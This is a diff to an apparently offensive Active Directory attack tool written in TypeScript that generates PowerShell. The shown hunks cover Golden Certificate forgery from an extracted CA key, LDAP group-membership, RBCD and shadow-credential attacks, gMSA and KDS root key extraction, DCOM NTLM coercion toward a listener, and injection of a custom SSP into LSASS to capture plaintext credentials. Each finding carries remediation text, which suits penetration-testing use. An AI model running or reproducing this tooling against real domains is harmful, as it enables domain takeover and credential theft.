+      "Enforce StrongCertificateBindingEnforcement=2. Monitor Event 4768 PreAuthType=16. Audit msDS-KeyCredentialLink changes",
   })
   return { output: output.join("\n"), findings }
 }
-
-
-
 
 // ── Certificate & Advanced Credential Programs ──
 
@@ -11755,7 +11887,7 @@ foreach ($caEntry in $caContainer.Children) {
 Write-Output ""
 Write-Output "[*] Checking CA backup permissions..."
 try {
-    $caInfo = certutil -config "${ca || ''}" -CAInfo 2>&1
+    $caInfo = certutil -config "${ca || ""}" -CAInfo 2>&1
     if ($caInfo -match "CA type") {
         Write-Output "[+] certutil -CAInfo accessible — may have backup rights"
     }
@@ -11861,7 +11993,8 @@ if ($localCA) {
         status: "EXTRACTED",
         resource: `adcs://${ca}`,
         title: "CA private key extracted — Golden Certificate possible",
-        details: "CA private key extracted. Can forge certificates for any domain user, enabling persistent domain access that survives krbtgt rotation",
+        details:
+          "CA private key extracted. Can forge certificates for any domain user, enabling persistent domain access that survives krbtgt rotation",
         remediation: "Rotate CA keys immediately. Restrict CA backup permissions. Enable CA audit logging",
       })
     }
@@ -11960,7 +12093,8 @@ Write-Output "    2. winhook unpac_hash --cert ${certPath} --password CyberStr1k
         resource: `adcs://${targetUser}`,
         title: `Golden Certificate forged for ${targetUser}`,
         details: `Forged certificate at ${certPath} — can authenticate as ${targetUser} via PKINIT or Schannel`,
-        remediation: "Revoke all certificates signed by compromised CA. Regenerate CA key pair. Monitor certificate-based authentication events (4768 with pre-auth type 16)",
+        remediation:
+          "Revoke all certificates signed by compromised CA. Regenerate CA key pair. Monitor certificate-based authentication events (4768 with pre-auth type 16)",
       })
     }
   }
@@ -12036,7 +12170,9 @@ try {
     $whoamiResult = $ldapConn.SendRequest($whoami)
     Write-Output "[+] Authenticated successfully via Schannel"
 
-    ${action === "add-user-to-group" ? `
+    ${
+      action === "add-user-to-group"
+        ? `
     # Add user to group
     if (-not "${targetUser}" -or -not "${targetGroup}") {
         Write-Output "[!] Required: --target-user and --target-group"
@@ -12071,7 +12207,9 @@ try {
             Write-Output "[+] Successfully added $userDN to $groupDN"
         }
     }
-    ` : action === "rbcd" ? `
+    `
+        : action === "rbcd"
+          ? `
     # Set RBCD on target
     Write-Output "[*] Setting RBCD delegation..."
     if (-not "${targetUser}") {
@@ -12119,7 +12257,9 @@ try {
             }
         }
     }
-    ` : action === "shadow-cred" ? `
+    `
+          : action === "shadow-cred"
+            ? `
     # Add shadow credential
     Write-Output "[*] Adding shadow credential to target..."
     if (-not "${targetUser}") {
@@ -12140,7 +12280,8 @@ try {
             Write-Output "    winhook shadow_creds --target ${targetUser} --action add"
         }
     }
-    ` : `
+    `
+            : `
     # LDAP shell — enumerate with cert auth
     Write-Output ""
     Write-Output "[*] Querying domain info via cert-authenticated LDAP..."
@@ -12170,7 +12311,8 @@ try {
     foreach ($e in $privResult.Entries) {
         Write-Output "    $($e.Attributes['sAMAccountName'][0])"
     }
-    `}
+    `
+    }
 
 } catch {
     Write-Output "[!] LDAPS bind failed: $($_.Exception.Message)"
@@ -12191,7 +12333,8 @@ $ldapConn.Dispose()
       resource: `ldap://${target}`,
       title: "Certificate-based LDAP authentication successful",
       details: `Authenticated to ${target} using certificate ${cert}. Action: ${action}`,
-      remediation: "Enable LDAP channel binding. Require strong certificate mapping (StrongCertificateBindingEnforcement=2). Monitor 4768 events with pre-auth type 16",
+      remediation:
+        "Enable LDAP channel binding. Require strong certificate mapping (StrongCertificateBindingEnforcement=2). Monitor 4768 events with pre-auth type 16",
     })
   }
 
@@ -12401,8 +12544,10 @@ Write-Output "[+] gMSA SID: $sid"
         status: "EXTRACTED",
         resource: `ad://gmsa/${target}`,
         title: `gMSA password extracted: ${target}`,
-        details: "NT hash computed from msDS-ManagedPassword blob. Can be used for pass-the-hash, silver ticket, or DCSync if gMSA has replication rights",
-        remediation: "Review PrincipalsAllowedToRetrieveManagedPassword ACL. Monitor for unusual gMSA password reads (event 4662 on msDS-ManagedPassword)",
+        details:
+          "NT hash computed from msDS-ManagedPassword blob. Can be used for pass-the-hash, silver ticket, or DCSync if gMSA has replication rights",
+        remediation:
+          "Review PrincipalsAllowedToRetrieveManagedPassword ACL. Monitor for unusual gMSA password reads (event 4662 on msDS-ManagedPassword)",
       })
     }
   } else if (action === "golden") {
@@ -12463,7 +12608,8 @@ foreach ($key in $keys) {
         resource: "ad://kds-root-keys",
         title: "KDS root key extracted — GoldenGMSA possible",
         details: "KDS root key data retrieved. Can compute ANY gMSA password offline without AD access",
-        remediation: "Rotate KDS root keys. Restrict access to CN=Master Root Keys container. Monitor 4662 events on KDS key objects",
+        remediation:
+          "Rotate KDS root keys. Restrict access to CN=Master Root Keys container. Monitor 4662 events on KDS key objects",
       })
     }
   }
@@ -12792,7 +12938,8 @@ if ($canAttack) {
       resource: `ad://${target}`,
       title: `RBCD chain prerequisites checked for ${target}`,
       details: result.stdout.substring(0, 500),
-      remediation: "Set MachineAccountQuota to 0. Monitor for new machine account creation (event 4741). Audit msDS-AllowedToActOnBehalfOfOtherIdentity changes (event 5136)",
+      remediation:
+        "Set MachineAccountQuota to 0. Monitor for new machine account creation (event 4741). Audit msDS-AllowedToActOnBehalfOfOtherIdentity changes (event 5136)",
     })
   } else if (action === "exploit") {
     const machineName = newMachineName.replace(/\$$/, "")
@@ -13064,7 +13211,8 @@ try {
     }
   } else {
     const script = methods[method]
-    if (!script) return { output: `[!] Unknown method: ${method}. Use: datacollector, filesystem, update, all`, findings }
+    if (!script)
+      return { output: `[!] Unknown method: ${method}. Use: datacollector, filesystem, update, all`, findings }
     const result = await ps(script, timeout)
     output.push(result.stdout)
   }
@@ -13077,7 +13225,8 @@ try {
     resource: `dcom://${target}`,
     title: `DCOM NTLM coercion attempted on ${target}`,
     details: `Remote Monologue via DCOM objects targeting ${target}. Listener: ${listener}:${port}. Method: ${method}. Check responder/ntlmrelayx for captured hashes`,
-    remediation: "Disable unnecessary DCOM objects. Enable LDAP signing. Use EPA (Extended Protection for Authentication). Monitor DCOM activation events (10036) and anomalous SMB connections",
+    remediation:
+      "Disable unnecessary DCOM objects. Enable LDAP signing. Use EPA (Extended Protection for Authentication). Monitor DCOM activation events (10036) and anomalous SMB connections",
   })
 
   return { output: output.join("\n"), findings }
@@ -13474,14 +13623,15 @@ if ($hLsass -ne [IntPtr]::Zero) {
       status: "INJECTED",
       resource: "lsa://security-packages",
       title: "Custom SSP registered for credential interception",
-      details: "Security Support Provider injected via AddSecurityPackage. New logon credentials will be captured in plaintext",
-      remediation: "Monitor LSA Security Packages registry key. Alert on AddSecurityPackage API calls. Enable Credential Guard",
+      details:
+        "Security Support Provider injected via AddSecurityPackage. New logon credentials will be captured in plaintext",
+      remediation:
+        "Monitor LSA Security Packages registry key. Alert on AddSecurityPackage API calls. Enable Credential Guard",
     })
   }
 
   return { output: output.join("\n"), findings }
 }
-
 
 // ── Dispatch ──
 
